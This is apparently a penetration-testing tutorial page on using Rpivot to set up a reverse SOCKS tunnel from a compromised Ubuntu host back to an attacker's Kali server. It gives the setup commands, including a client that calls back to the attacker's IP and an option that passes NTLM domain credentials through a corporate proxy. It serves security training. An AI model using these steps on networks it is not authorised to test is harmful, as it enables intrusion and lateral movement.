---
description: >-
  Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling.
  Rpivot binds a machine inside a network to and external server and exposes the
  client's local port on the server-side.
---

# Web Server Pivoting with Rpivot

**Clone Rpivot**

```shell-session
attacker@kali$ git clone https://github.com/klsecservices/rpivot.git
```

**Running server.py from the Attack Host**

```shell-session
attacker@kali$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

We need to transfer the _**client.py**_ to the target.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ scp -r rpivot ubuntu@&#x3C;IpaddressOfTarget>:/home/ubuntu/
</strong></code></pre>

**Running client.py from Pivot Target (python2.7 required)**

```shell-session
victim@ubuntu:~/rpivot$ python2.7 client.py --server-ip <attacker-ip> --server-port 9999
```

We can configure proxychains to pivot over our local server on localhost:9050 that was started by the Rpivot python server.

```shell-session
proxychains firefox-esr 172.16.5.135:80
```



Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot. We do so by providing the username and password via the NTLMproxy.

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

_**Proxy Authentication using NTLM:**_

[https://learn.microsoft.com/en-us/openspecs/office\_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a](https://learn.microsoft.com/en-us/openspecs/office\_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a)\
